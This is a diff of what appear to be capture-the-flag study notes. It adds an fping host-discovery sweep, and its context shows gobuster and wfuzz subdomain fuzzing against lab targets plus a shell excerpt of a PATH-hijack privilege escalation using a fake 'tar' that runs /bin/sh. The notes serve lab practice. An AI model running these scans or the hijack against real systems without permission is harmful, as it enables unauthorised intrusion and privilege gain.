@@ -1,3 +1,6 @@
+Find up machine in IP range
+> fping -s -g <IP_RANGE>
+
 subdomain
 > Gobuster vhost -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u <website>
 > wfuzz -c -u 10.10.11.177 -H "Host: FUZZ.siteisup.htb" -w Dictionnaires/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
@@ -29,3 +32,6 @@ matt@pandora:/tmp$ cat tar
 /bin/sh
 matt@pandora:/tmp$ chmod 777 tar
 matt@pandora:/tmp$ export PATH=/tmp:$PATH
+
+
+
